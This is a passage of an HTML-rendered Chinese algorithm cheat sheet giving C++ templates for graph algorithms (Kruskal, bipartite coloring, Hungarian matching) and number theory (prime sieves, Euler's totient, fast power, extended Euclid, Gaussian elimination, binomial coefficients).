class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sort(edges, edges + m);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;    <span class="hljs-comment">// 初始化并查集</span><br><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>, cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;<br><br>        a = find(a), b = find(b);<br>        <span class="hljs-keyword">if</span> (a != b)     <span class="hljs-comment">// 如果两个连通块不连通，则将这两个连通块合并</span><br>        &#123;<br>            p[a] = b;<br>            res += w;<br>            cnt ++ ;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (cnt &lt; n - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> INF;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-11-染色法判别二分图"><a href="#3-11-染色法判别二分图" class="headerlink" title="3.11 染色法判别二分图"></a>3.11 染色法判别二分图</h3><p>时间复杂度是 O(n+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// n表示点数</span><br><span class="hljs-keyword">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// 邻接表存储图</span><br><span class="hljs-keyword">int</span> color[N];       <span class="hljs-comment">// 表示每个点的颜色，-1表示未染色，0表示白色，1表示黑色</span><br><br><span class="hljs-comment">// 参数：u表示当前节点，c表示当前点的颜色</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u, <span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    color[u] = c;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[u]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (color[j] == <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!dfs(j, !c)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (color[j] == c) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(color, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span> color);<br>    <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">if</span> (color[i] == <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">if</span> (!dfs(i, <span class="hljs-number">0</span>))<br>            &#123;<br>                flag = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-12-匈牙利算法"><a href="#3-12-匈牙利算法" class="headerlink" title="3.12 匈牙利算法"></a>3.12 匈牙利算法</h3><p>时间复杂度是 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n1, n2;     <span class="hljs-comment">// n1表示第一个集合中的点数，n2表示第二个集合中的点数</span><br><span class="hljs-keyword">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// 邻接表存储所有边，匈牙利算法中只会用到从第一个集合指向第二个集合的边，所以这里只用存一个方向的边</span><br><span class="hljs-keyword">int</span> match[N];       <span class="hljs-comment">// 存储第二个集合中的每个点当前匹配的第一个集合中的点是哪个</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 表示第二个集合中的每个点是否已经被遍历过</span><br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[x]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (match[j] == <span class="hljs-number">0</span> || find(match[j]))<br>            &#123;<br>                match[j] = x;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// 求最大匹配数，依次枚举第一个集合中的每个点能否匹配第二个集合中的点</span><br><span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i ++ )<br>&#123;<br>    <span class="hljs-built_in">memset</span>(st, <span class="hljs-literal">false</span>, <span class="hljs-keyword">sizeof</span> st);<br>    <span class="hljs-keyword">if</span> (find(i)) res ++ ;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="四-数学知识"><a href="#四-数学知识" class="headerlink" title="四.数学知识"></a>四.数学知识</h2><h3 id="4-1-试除法判定质数"><a href="#4-1-试除法判定质数" class="headerlink" title="4.1 试除法判定质数"></a>4.1 试除法判定质数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">is_prime</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-试除法分解质因数"><a href="#4-2-试除法分解质因数" class="headerlink" title="4.2 试除法分解质因数"></a>4.2 试除法分解质因数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">divide</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> s = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i, s ++ ;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; s &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) <span class="hljs-built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-朴素筛法求素数"><a href="#4-3-朴素筛法求素数" class="headerlink" title="4.3 朴素筛法求素数"></a>4.3 朴素筛法求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (st[i]) <span class="hljs-keyword">continue</span>;<br>        primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + i; j &lt;= n; j += i)<br>            st[j] = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-线性筛法求素数"><a href="#4-4-线性筛法求素数" class="headerlink" title="4.4 线性筛法求素数"></a>4.4 线性筛法求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-5-试除法求所有约数"><a href="#4-5-试除法求所有约数" class="headerlink" title="4.5 试除法求所有约数"></a>4.5 试除法求所有约数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">get_divisors</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; res;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res.push_back(i);<br>            <span class="hljs-keyword">if</span> (i != x / i) res.push_back(x / i);<br>        &#125;<br>    sort(res.begin(), res.end());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-约数个数和约数之和"><a href="#4-6-约数个数和约数之和" class="headerlink" title="4.6 约数个数和约数之和"></a>4.6 约数个数和约数之和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">如果 N = p1^c1 * p2^c2 * ... *pk^ck<br>约数个数： (c1 + <span class="hljs-number">1</span>) * (c2 + <span class="hljs-number">1</span>) * ... * (ck + <span class="hljs-number">1</span>)<br>约数之和： (p1^<span class="hljs-number">0</span> + p1^<span class="hljs-number">1</span> + ... + p1^c1) * ... * (pk^<span class="hljs-number">0</span> + pk^<span class="hljs-number">1</span> + ... + pk^ck)<br></code></pre></div></td></tr></table></figure><h3 id="4-7-欧几里得算法"><a href="#4-7-欧几里得算法" class="headerlink" title="4.7 欧几里得算法"></a>4.7 欧几里得算法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> b ? gcd(b, a % b) : a;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-8-求欧拉函数"><a href="#4-8-求欧拉函数" class="headerlink" title="4.8 求欧拉函数"></a>4.8 求欧拉函数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">phi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res = res / i * (i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) res = res / x * (x - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-9-筛法求欧拉函数"><a href="#4-9-筛法求欧拉函数" class="headerlink" title="4.9 筛法求欧拉函数"></a>4.9 筛法求欧拉函数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">int</span> euler[N];           <span class="hljs-comment">// 存储每个数的欧拉函数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_eulers</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    euler[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i])<br>        &#123;<br>            primes[cnt ++ ] = i;<br>            euler[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            <span class="hljs-keyword">int</span> t = primes[j] * i;<br>            st[t] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>)<br>            &#123;<br>                euler[t] = euler[i] * primes[j];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            euler[t] = euler[i] * (primes[j] - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-10-快速幂"><a href="#4-10-快速幂" class="headerlink" title="4.10 快速幂"></a>4.10 快速幂</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">求 m^k mod p，时间复杂度 O(logk)。<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">qmi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span> % p, t = m;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k&amp;<span class="hljs-number">1</span>) res = res * t % p;<br>        t = t * t % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-11-扩展欧几里得算法"><a href="#4-11-扩展欧几里得算法" class="headerlink" title="4.11 扩展欧几里得算法"></a>4.11 扩展欧几里得算法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 求x, y，使得ax + by = gcd(a, b)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> &amp;x, <span class="hljs-keyword">int</span> &amp;y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!b)<br>    &#123;<br>        x = <span class="hljs-number">1</span>; y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">int</span> d = exgcd(b, a % b, y, x);<br>    y -= (a/b) * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-12-高斯消元"><a href="#4-12-高斯消元" class="headerlink" title="4.12 高斯消元"></a>4.12 高斯消元</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// a[N][N]是增广矩阵</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gauss</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> c, r;<br>    <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>; c &lt; n; c ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = r;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r; i &lt; n; i ++ )   <span class="hljs-comment">// 找到绝对值最大的行</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; <span class="hljs-built_in">fabs</span>(a[t][c]))<br>                t = i;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[t][c]) &lt; eps) <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = c; i &lt;= n; i ++ ) swap(a[t][i], a[r][i]);      <span class="hljs-comment">// 将绝对值最大的行换到最顶端</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;= c; i -- ) a[r][i] /= a[r][c];      <span class="hljs-comment">// 将当前行的首位变成1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r + <span class="hljs-number">1</span>; i &lt; n; i ++ )       <span class="hljs-comment">// 用当前行将下面所有的列消成0</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; eps)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = n; j &gt;= c; j -- )<br>                    a[i][j] -= a[r][j] * a[i][c];<br><br>        r ++ ;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r &lt; n)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r; i &lt; n; i ++ )<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 无解</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 有无穷多组解</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j ++ )<br>            a[i][n] -= a[i][j] * a[j][n];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 有唯一解</span><br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-13-递归法求组合数"><a href="#4-13-递归法求组合数" class="headerlink" title="4.13 递归法求组合数"></a>4.13 递归法求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// c[a][b] 表示从a个苹果中选b个的方案数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i ++ )<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= i; j ++ )<br>        <span class="hljs-keyword">if</span> (!j) c[i][j] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> c[i][j] = (c[i - <span class="hljs-number">1</span>][j] + c[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) % mod;<br></code></pre></div></td></tr></table></figure><h3 id="4-14-通过预处理逆元的方式求组合数"><a href="#4-14-通过预处理逆元的方式求组合数" class="headerlink" title="4.14 通过预处理逆元的方式求组合数"></a>4.14 通过预处理逆元的方式求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">首先预处理出所有阶乘取模的余数fact[N]，以及所有阶乘取模的逆元infact[N]<br>如果取模的数是质数，可以用费马小定理求逆元<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">qmi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> k, 